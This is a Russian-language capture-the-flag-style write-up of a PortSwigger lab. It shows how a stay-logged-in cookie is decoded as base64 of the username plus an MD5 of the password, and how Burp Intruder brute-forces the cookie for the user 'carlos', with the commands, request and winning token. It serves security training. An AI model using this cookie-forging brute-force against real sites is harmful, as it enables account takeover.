---
title: "Brute-forcing a stay-logged-in cookie"
date: 2025-10-02
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie"
classes: wide
---

В данной лабе есть функция `Stay logged`. Уязвимость в `cookie` позволит обойти механизм **аутентификации**. Нужно получить доступ к аккаунту `carlos`.Данные для входа: `wiener`:`peter`.

```
https://0a9a005b04645fe381485247005e002e.web-security-academy.net
```

## Solution

Залогинюсь, чтобы получить эту интересную печеньку.

Вот она: `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`. На первый взгляд похоже на `base64`. Попробую декодировать:

```
cu63:~/ $ echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d                                                                        
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Хмм, попробую подставить другое имя пользователя и зайти:

```
cu63:~/ $ echo "carlos:51dc30ddc473d43a6011e9ebba6ca770" | base64                                                                                       
Y2FybG9zOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcwCg==
```

Не получилось. Нужно подставить правильное значение после `:`.  Значение имеет длину 32. Похоже на длину хешей. Попробую посчитать популярные хеши от пароля `peter`:

```
sha1sum - bb7a1c32dfb1ae40be9560720747d7304ac5228a
md5 - 51dc30ddc473d43a6011e9ebba6ca770
```

Значит сайт использует следующую формулу:

```
base64(login + ':' + md5(password))
```

Соберу атаку в `Intruder`:

```http
GET /my-account HTTP/2
Host: 0a9a005b04645fe381485247005e002e.web-security-academy.net
Cookie: session=gsyx7QdOYc50472BFp6Qy8TiMP0pZEvp; stay-logged-in=§val§
```

Возьму предложенный список паролей от `Port Swigger` [туть](https://portswigger.net/web-security/authentication/auth-lab-passwords). А атаку настрою вот так:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Brute-forcing_a_stay-logged-in_cookie/1.png){: height="200" .align-center}

Начну атаку. В случае успешного токена должен вернуться ответ `200`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Brute-forcing_a_stay-logged-in_cookie/2.png){: height="200" .align-center}

Подошел следующий токен:

```
Y2FybG9zOmFhNDdmODIxNWM2ZjMwYTBkY2RiMmEzNmE5ZjQxNjhl - base64("carlos:" + md5("daniel"))
```

Войду в аккаунт:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Brute-forcing_a_stay-logged-in_cookie/3.png){: height="200" .align-center}